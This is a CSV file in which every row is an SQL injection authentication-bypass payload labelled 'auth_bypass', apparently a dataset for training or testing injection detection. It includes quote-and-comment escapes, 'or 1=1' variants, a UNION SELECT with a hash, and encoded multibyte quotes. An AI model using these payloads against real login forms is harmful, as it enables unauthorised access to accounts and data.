payload,label
""" """,auth_bypass
""" #",auth_bypass
""" --",auth_bypass
"""&""",auth_bypass
"""*""",auth_bypass
"""-""",auth_bypass
"""--""",auth_bypass
"""/*",auth_bypass
"""^""",auth_bypass
',auth_bypass
' #,auth_bypass
' ',auth_bypass
' --,auth_bypass
' –,auth_bypass
'#,auth_bypass
'&',auth_bypass
'*',auth_bypass
'-',auth_bypass
'--,auth_bypass
'--',auth_bypass
"'--' / ""--""",auth_bypass
'/*,auth_bypass
'^',auth_bypass
=,auth_bypass
==,auth_bypass
"""-||0""",auth_bypass
'-||0',auth_bypass
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",auth_bypass
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",auth_bypass
1′) and '1′='1–,auth_bypass
%8C%A8%27)||1-- 2,auth_bypass
%8C%A8%27||1-- 2,auth_bypass
%8C%A8%27 Or 1=1-- 2,auth_bypass
%8C%A8%27) Or 1=1-- 2,auth_bypass
%8C%A8%27 Or 1-- 2,auth_bypass
%8C%A8%27)Or(1)-- 2,auth_bypass
%8C%A8%27Or(1)-- 2,auth_bypass
%8C%A8%27) Or 1-- 2,auth_bypass
%A8%27)||1-- 2,auth_bypass
%A8%27||1-- 2,auth_bypass
%A8%27 Or 1=1-- 2,auth_bypass
%A8%27) Or 1=1-- 2,auth_bypass
%A8%27 Or 1-- 2,auth_bypass
%A8%27)Or(1)-- 2,auth_bypass
%A8%27Or(1)-- 2,auth_bypass
%A8%27) Or 1-- 2,auth_bypass
"admin"" #",auth_bypass
"admin"" --",auth_bypass
"admin""/*",auth_bypass
admin' #,auth_bypass
admin' --,auth_bypass
admin' -- -,auth_bypass
admin'/*,auth_bypass
"admin' and substring(password/text(),1,1)='7",auth_bypass
admin';-- azer,auth_bypass
"admin"" or ""1""=""1",auth_bypass
"admin"" or ""1""=""1""#",auth_bypass
"admin"" or ""1""=""1""--",auth_bypass
"admin"" or ""1""=""1""/*",auth_bypass
"admin"" or 1=1",auth_bypass
"admin"" or 1=1#",auth_bypass
"admin"" or 1=1--",auth_bypass
"admin"" or 1=1/*",auth_bypass
"admin"") or ""1""=""1",auth_bypass
"admin"") or ""1""=""1""#",auth_bypass
"admin"") or ""1""=""1""--",auth_bypass
"admin"") or ""1""=""1""/*",auth_bypass
"admin"") or (""1""=""1",auth_bypass
"admin"") or (""1""=""1""#",auth_bypass
"admin"") or (""1""=""1""--",auth_bypass
"admin"") or (""1""=""1""/*",auth_bypass
admin' or '1'='1,auth_bypass
admin' or '1'='1'#,auth_bypass
admin' or '1'='1'--,auth_bypass
admin' or '1'='1'/*,auth_bypass
admin' or 1=1,auth_bypass
admin' or 1=1#,auth_bypass
admin' or 1=1--,auth_bypass
admin' or 1=1/*,auth_bypass
admin') or '1'='1,auth_bypass
admin') or '1'='1'#,auth_bypass
admin') or '1'='1'--,auth_bypass
admin') or '1'='1'/*,auth_bypass
admin') or ('1'='1,auth_bypass
